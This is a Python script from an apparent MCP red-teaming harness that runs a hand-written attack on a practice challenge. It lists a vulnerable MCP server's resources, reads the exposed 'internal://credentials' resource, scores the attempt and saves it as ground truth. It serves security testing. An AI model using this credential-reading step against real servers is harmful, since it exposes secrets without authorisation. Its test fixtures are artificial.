"""M0: hand-crafted black-box attack on DVMCP challenge 1.

Strategy (direct read, no LLM involved):
  1. recon: list_resources() to prove `internal://credentials` is exposed
     — recorded to `recon_calls`, does NOT count toward path_ok.
  2. attack: read_resource("internal://credentials") — records into `mcp_calls` and
     satisfies path_rules `is_path_ok_challenge_01` via the direct-read branch.
  3. Score with `scorers.composite.judge`; expect success=True.
  4. Persist as `runs/manual_ground_truth/challenge_01.json`.

Run:  python -m scripts.m0_manual_challenge_01
"""

from __future__ import annotations

import asyncio
import json
from pathlib import Path

from mcp_redteam.contracts import Attempt, Verdict
from mcp_redteam.orchestrator.runner import load_challenge_spec
from mcp_redteam.scorers.composite import judge
from mcp_redteam.targets.mcp_client import McpSession

OUT = Path("runs/manual_ground_truth/challenge_01.json")


async def main() -> None:
    spec = load_challenge_spec("01")
    async with McpSession(spec.sse_url) as sess:
        recon = await sess.list_resources()
        attack = await sess.read_resource("internal://credentials")

    attempt = Attempt(
        turn=0,
        mode="pair",
        strategy="direct_override",
        attacker_prompt=(
            "manual black-box: enumerate resources then read internal://credentials"
        ),
        victim_reply=None,
        mcp_calls=[attack],
        recon_calls=[recon],
        target_output=attack.result_text,
        verdict=Verdict(  # placeholder; overwritten below
            success=False,
            path_ok=False,
            regex_ok=False,
            short_circuit=False,
            confidence=0.0,
            reason="pre-scoring",
            evidence="",
        ),
    )
    verdict = judge(spec, attempt)
    attempt = attempt.model_copy(update={"verdict": verdict})

    OUT.parent.mkdir(parents=True, exist_ok=True)
    OUT.write_text(attempt.model_dump_json(indent=2), encoding="utf-8")

    print(json.dumps(verdict.model_dump(), ensure_ascii=False, indent=2))
    print(f"[m0] wrote {OUT}")


if __name__ == "__main__":
    asyncio.run(main())
